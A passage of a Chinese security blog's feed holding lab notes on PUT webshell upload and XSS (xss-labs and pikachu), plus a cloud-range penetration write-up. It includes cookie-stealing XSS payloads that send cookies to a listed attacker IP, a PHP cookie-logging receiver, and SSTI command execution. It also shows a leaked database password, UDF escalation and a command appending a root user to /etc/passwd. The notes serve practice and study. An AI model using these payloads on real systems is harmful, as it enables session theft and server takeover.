alt="null"></p><p>上传后文件名qwe.php</p><h2 id="put方法漏洞上传webshell"><a href="#put方法漏洞上传webshell" class="headerlink" title="put方法漏洞上传webshell"></a>put方法漏洞上传webshell</h2><p>put上传文件</p><p>HTTP1.0定义了三种请求方法：GET,POST和HEAD方法。<br>HTTP1.1新增了五种请求方法：OPTIONS,PUT,DELETE,TRACE和CONNECT方法。<br><a href="https://developer.aliyun.com/article/1633809">HTTP九种请求方法的功能用途与特性详解-开发者社区-阿里云</a></p><p>如果服务器存在a.php上传a.php就会替换掉把</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">telent ip 端口</span><br><span class="line">OPTIONS / HTTP/1.1</span><br><span class="line">HOST: IP</span><br></pre></td></tr></table></figure><p>查看开放<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972094977-ff081812-171c-4dfa-abd6-9b4abb42ad0e.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -h 网站</span><br></pre></td></tr></table></figure><p>b站 w啥都学</p><h1 id="XSSlabs"><a href="#XSSlabs" class="headerlink" title="XSSlabs"></a>XSSlabs</h1><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>xss，跨站脚本攻击</p><p>嵌入网页，主要攻击客户端</p><p>用户名信息<br>键盘详细<br>cookie密码</p><p>1.request<br>2.回index.html,index.php  读取客户想要访问的页面<br>3.浏览器解析执行html展示页面效果  response</p><p>攻击代码一般是前端js代码<br>浏览器解析攻击代码<br>1.获取用户名密码<br>2.发送给hacker<br>3.基于你的身份登录，系统如果是后台管理员系统，为所欲为</p><p>前端Javascript，VBscript<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683340-0692a657-f458-4338-a3d1-af6f1775ad03.png" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683414-2ce892ba-bbcb-4a8f-ab89-0f2a393e2f8a.png" alt="null"></p><p>XSS分类<br>反射型，Dom型，存储型</p><p>有输入输出的地方都可以尝试XSS，有输出可以做xss</p><p>存储型： 发送一段js代码，服务器保存到数据库里面了，一般在留言板，评论区，注册等页面，存储型<br>反射型： 发了什么，然后服务器直接返回到客户端了，一次性 ，一般在查询类页面，这叫反射型<br>DOM型，又有反射，又有存储</p><p>输入jaden<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683484-7f572452-f717-4af6-8300-fc13f56a7c72.png" alt="null"></p><p>直接返回jaden</p><p>点下面这个直接找到input标签的代码<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683546-df49e633-b2b2-4ce0-9ec7-21b54c92fd67.png" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683607-16744cde-6c06-4b4e-bc08-b47f7e1724f5.png" alt="null"></p><p>这个input做了长度限制<br>修改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(123);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p> 出现弹框窗口，执行成功<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683675-06402529-6da9-406a-8a41-aec88c5a1490.png" alt="null"></p><p>存储型执行，点击其他去页面返回仍然会显示<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683738-61db54ff-cfbb-44ff-8d1d-877f729e1a95.png" alt="null"></p><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>DOM全称是DocumentObjectModel，也就是文档对象模型<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683814-6bad2333-a1cf-43b1-8560-89a1660e9cb2.png" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683882-a3ce5138-2f35-4e4b-9fdd-a3bf27923c8e.png" alt="null"><br>&#x3D;&#x3D;通过js代码操作文档对象模型触发的漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><p>dom型xss-x</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633683954-91f53242-0241-486b-9c69-ede7a66f3ce6.png" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684020-aa88fbe5-2c9b-4049-87b7-53b5ede6e317.png" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684101-eee2f036-24fe-42dd-b09e-d9d1b4727d15.png" alt="null"><br>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">domxss</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                        <span class="keyword">var</span> str = window.location.search;</span><br><span class="line">                        <span class="keyword">var</span> txss = <span class="title function_ invoke__">decodeURIComponent</span>(str.<span class="title function_ invoke__">split</span>(<span class="string">&quot;text=&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        <span class="keyword">var</span> xss = txss.<span class="title function_ invoke__">replace</span>(/\+/g,<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="comment">//                        alert(xss);</span></span><br><span class="line"></span><br><span class="line">                        document.<span class="title function_ invoke__">getElementById</span>(<span class="string">&quot;dom&quot;</span>).innerHTML = <span class="string">&quot;&lt;a href=&#x27;&quot;</span>+xss+<span class="string">&quot;&#x27;&gt;就让往事都随风,都随风吧&lt;/a&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//试试：&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span></span><br><span class="line">                    <span class="comment">//试试：&#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;,闭合掉就行</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick=&quot;alert(&#x27;xss&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684181-76310786-a2a3-4e28-8d4d-2b7b65f622e2.png" alt="null"></p><p>可能触发DOM型XSS的js操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.referer</span><br><span class="line">window.name</span><br><span class="line">location</span><br><span class="line">innerHTML</span><br><span class="line">document.write</span><br></pre></td></tr></table></figure><p>闭合标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick=&quot;alert(1111)&quot;</span><br><span class="line">&#x27;onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&lt;a href=&quot;&#x27;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;&gt;what do you see?&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>工具测试</p><p>自动化工具<br>AWVS，APPscan，xray等大型工具，xssstrike</p><p>手工测试</p><h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>过程：想要盗取别人的cookie信息的话有一个前提条件，就是你应该在别人触发你的xss攻击时，你的代码应该将收集hJkie信息发送给你的平台来接收，这样才获取到了数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;document.location =&#x27;http://192.168.0.15/pikachu/pkxss/xcookie/cookie.php?cookie=&#x27;+</span><br><span class="line">document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这个ip192.168.0.15是黑客ip然后这里因为有点麻烦，我就直接在本机上操作了<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684264-ea53ab74-d0f9-4765-b0e7-08cd8b7bea1b.png" alt="null"><br>获取cookie的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/config.inc.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&#x27;../inc/mysql.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$link</span>=<span class="title function_ invoke__">connect</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//这个是获取cookie的api页面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$time</span>=<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d g:i:s&#x27;</span>);</span><br><span class="line">    <span class="variable">$ipaddress</span>=<span class="title function_ invoke__">getenv</span> (<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">    <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">    <span class="variable">$referer</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">    <span class="variable">$useragent</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">    <span class="variable">$query</span>=<span class="string">&quot;insert cookies(time,ipaddress,cookie,referer,useragent) </span></span><br><span class="line"><span class="string">    values(&#x27;<span class="subst">$time</span>&#x27;,&#x27;<span class="subst">$ipaddress</span>&#x27;,&#x27;<span class="subst">$cookie</span>&#x27;,&#x27;<span class="subst">$referer</span>&#x27;,&#x27;<span class="subst">$useragent</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$link</span>, <span class="variable">$query</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:http://192.168.1.4/pikachu/index.php&quot;</span>);<span class="comment">//重定向到一个可信的网站</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>控制台</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&#x27;www.baidu.com&#x27;;</span><br></pre></td></tr></table></figure><p>给某个网址发请求，跳转到网址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684368-a781708d-645b-4ca7-ab02-78adfd2c4c0e.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=&#x27;http:jd.com?cookie=&#x27;document.cookie;</span><br></pre></td></tr></table></figure><p>黑客的主机跑网站</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684446-a1479f2c-e6f0-43b3-921d-1a93387371c8.png" alt="null"></p><p>xss的post获取cookie登录</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;postsubmit&quot;</span>).<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/pikachu/vul/xss/xsspost/xss_reflected_post.php&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;xssr_in&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">value</span>=</span></span><br><span class="line"><span class="tag">    <span class="string">&quot;&lt;script&gt;</span></span></span><br><span class="line"><span class="string"><span class="tag">document.location = &#x27;http://192.168.1.15/pkxss/xcookie/cookie.php?cookie=&#x27; + document.cookie;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &lt;/script&gt;&quot;</span></span></span><br><span class="line"><span class="tag">     /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;postsubmit&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">window.onload = function() &#123;</span><br><span class="line">  document.getElementById(&quot;postsubmit&quot;).click();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>onload当浏览器加载完页面所有内容后自动触发执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import java.text.SimpleDateFormat;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import java.util.Scanner;</span><br><span class="line"></span><br><span class="line">public class SimpleTimeConverter &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Scanner scanner = new Scanner(System.in);</span><br><span class="line">        </span><br><span class="line">        System.out.print(&quot;请输入13位的毫秒数: &quot;);</span><br><span class="line">        long milliseconds = scanner.nextLong();</span><br><span class="line">        </span><br><span class="line">        // 创建Date对象</span><br><span class="line">        Date date = new Date(milliseconds);</span><br><span class="line">        </span><br><span class="line">        // 创建时间格式化对象（24小时制）</span><br><span class="line">        SimpleDateFormat sdf = new SimpleDateFormat(&quot;HH:mm:ss&quot;);</span><br><span class="line">        </span><br><span class="line">        // 格式化时间</span><br><span class="line">        String timeString = sdf.format(date);</span><br><span class="line">        </span><br><span class="line">        System.out.println(&quot;24小时制时间: &quot; + timeString);</span><br><span class="line">        </span><br><span class="line">        scanner.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一打开就访问漏洞代码</p><h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>用后端语言php渲染html标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xss:4556/level1.php?name=&lt;a href=&quot;http://baidu.com&quot;&gt;db&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684527-fee70857-19ce-4693-82f0-4a8e42ee27c4.png" alt="null"><br>直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684605-056c44d9-50d9-4bbe-bfdd-9bd5a8d6a569.png" alt="null"><br>对进行了base64</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window[&#x27;alert&#x27;](&quot;先抱真帅&quot;)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684696-083e4859-d033-42f2-9ec2-d7270f8e7f12.png" alt="null"></p><p>页面源代码</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684796-f7eca820-76b0-4f0a-8d36-46ed58548c95.png" alt="null"></p><p>尝试闭合构造新语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onfocus=javascript:alert() &#x27;</span><br></pre></td></tr></table></figure><p>onfocus事件在元素获得焦点时触发，最常与<code>&lt;input&gt;</code>、<code>&lt;select&gt;</code> 和 <code>&lt;a&gt;</code> 标签一起使用，以上面图片的html标签<code>&lt;input&gt;</code>为例，<code>&lt;input&gt;</code>标签是有输入框的，简单来说，onfocus事件就是当输入框被点击的时候，就会触发myFunction()函数，然后我们再配合javascript伪协议来执行javascript代码</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684860-42435260-db7d-4ca0-ab9b-f8118a925e7b.png" alt="null"></p><p>尝试用双引号闭合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=javascript:alert() &quot;</span><br></pre></td></tr></table></figure><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633684929-aca29082-ac33-4b33-8942-7aa25379a0c8.png" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&quot;&gt; &lt;a href=javascript:alert()&gt;xxx&lt;/a&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765633685062-285f7e40-6a1b-4155-82b6-4efde400f6d8.png" alt="null"></p><p>尝试大小写绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a hRef=javascript:alert()&gt;x&lt;/a&gt; &lt;&quot;</span><br><span class="line">&quot; Onfocus=javascript:alert() &quot;</span><br><span class="line">&quot;&gt; &lt;sCript&gt;alert()&lt;/sCript&gt; &lt;&quot;</span><br></pre></td></tr></table></figure><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><p>双拼写绕过</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/2301_76913435/article/details/146044823">2025最新 upload-labs(1~21关) 靶场通关,超详细保姆级_uploadlabs-CSDN博客</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;pikachu+xss+ssti-labs汇总&lt;/p&gt;</summary>
    
    
    
    <category term="web靶场" scheme="https://flypigc.github.io/categories/web%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜Finance--外网打靶</title>
    <link href="https://flypigc.github.io/2025/12/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFinance--%E5%A4%96%E7%BD%91%E6%89%93%E9%9D%B6/"/>
    <id>https://flypigc.github.io/2025/12/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFinance--%E5%A4%96%E7%BD%91%E6%89%93%E9%9D%B6/</id>
    <published>2025-12-13T13:26:31.108Z</published>
    <updated>2025-12-20T01:56:04.108Z</updated>
    
    <content type="html"><![CDATA[<p>春秋云镜Finance–外网打靶</p><span id="more"></span><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fscan -h 39.101.71.180</span><br><span class="line">nmap 8.145.35.203 -p 22,80,3306,8081 -sCV</span><br></pre></td></tr></table></figure><p>发现22,80,3306,8081都是开着的<br>得到8081有JeecgBoot</p><h2 id="JeecgBoot-web8081"><a href="#JeecgBoot-web8081" class="headerlink" title="JeecgBoot web8081"></a>JeecgBoot web8081</h2><p>这里直接用工具扫一下扫到ssti<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632375749-25f8353c-ba1f-4a40-ab53-710e8570086b.jpg" alt="null"></p><p>利用JeecgBoot jmreport&#x2F;loadTableData SSTI模板注入漏洞 执行命令，但这个命令执行受限，我只要用一些特殊符号就报错，而且命令返回长度有限</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632375749-25f8353c-ba1f-4a40-ab53-710e8570086b.jpg" alt="null"></p><p>通过PWD命令获取到当前网站工作目录，扫描的时候发现存在mysql,大概率网站配置文件中存在Mysql连接的相关配置信息，翻找目录并没有找到有用的配置文件。 在工作目录下可以发现有一个jar包，这个网站大概率是用这个jar包运行的，</p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632375877-1e10b689-fbbd-4b45-8f36-da4785b55dbb.jpg" alt="null"></p><p>直接用cp命令把这个jar包放到80端口网站目录 &#x2F;var&#x2F;www&#x2F;html 下，然后访问路径即可下载这个jar包<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632376011-14547f4a-1ba4-4c0a-beeb-d31ea9f3cb4a.jpg" alt="null"></p><p><strong>显示失败但是是成功执行了的</strong></p><p>下载好后，直接解压这个jar包，全局搜索3306马上就能找到mysql的配置信息<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632376103-12357a9d-9ac0-416e-b75f-72ba8096ef1f.jpg" alt="null"></p><h2 id="mysql利用"><a href="#mysql利用" class="headerlink" title="mysql利用"></a>mysql利用</h2><p>username: root<br>password: oZOgpwlvgh2N01eS<br>然后利用mdut 连接数据库<br><a href="https://github.com/DeEpinGh0st/MDUT-Extend-Release">GitHub - DeEpinGh0st&#x2F;MDUT-Extend-Release: MDUT-Extend(扩展版本)</a></p><p>这里用Udf提权开启命令执行，然后写一个特权账户到 <code>/etc/passwd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/ChunQiu/Finance]</span><br><span class="line">└─# openssl passwd -6 123123   #生成密码hash</span><br><span class="line">$6$QrMcMXsfxBnF/K4m$xWsqsAYqpZEX649U/O5RqIzCUkjknjFzuvBksmKNz8r4L13zgWVW/Y3bs7jteMvSgAF7dVDtsPhfizTDKyPmD0</span><br><span class="line"></span><br><span class="line">#写到/etc/passwd （这里哈希密码有很多特殊符号用base64编码后写入）</span><br><span class="line">echo YzF0cnVzOiQ2JGlqL1o4Y3FxYXdPQTJzR2skYW1EVzVWZnhJMklsUURUem1lRG9XYTFKZlRJYjBsTm8yVGFMc3E3c3JsTWNEWFFiV1k3dUNJaE1zZWE0SE8uN2dQSDFxcVUyQkI3THZlN2p6Ny5WWTA6MDowOnJvb3Q6L2hvbWUvYzF0cnVzOi9iaW4vYmFzaA== |base64 -d&gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure><p>生成hash的时候<strong>这里去你的kali上执行，去它那个服务器跑不了</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632376282-f656ef63-c9af-4e7e-bd10-2978b60a7806.jpg" alt="null"></p><p>PS: 我感觉写 &#x2F;etc&#x2F;passwd 这一步可能也可以在Jeecgboot的利用工具中完成，但是我没成功过<br>xshell链接拿到第一个flag<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765632376370-64096c4a-18ab-4806-806d-e09e46e205ea.jpg" alt="null"></p><h2 id="内网代理-第一层"><a href="#内网代理-第一层" class="headerlink" title="内网代理(第一层)"></a>内网代理(第一层)</h2><p>进来后先看下网络连接，可以发现有个redis的docker，但里面没有什么东西，此外mysql数据库里面也是没有什么东西的<br>然后看一下网卡信息,看看内网网段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@web01:/# ifconfig</span><br><span class="line">docker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255</span><br><span class="line">        inet6 fe80::42:e2ff:fe68:591a  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 02:42:e2:68:59:1a  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 797  bytes 36609 (36.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 805  bytes 48471 (48.4 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.22.10.22  netmask 255.255.255.0  broadcast 172.22.10.255</span><br><span class="line">        inet6 fe80::216:3eff:fe06:4124  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:16:3e:06:41:24  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 91570  bytes 9390063 (9.3 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 95309  bytes 218743007 (218.7 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span 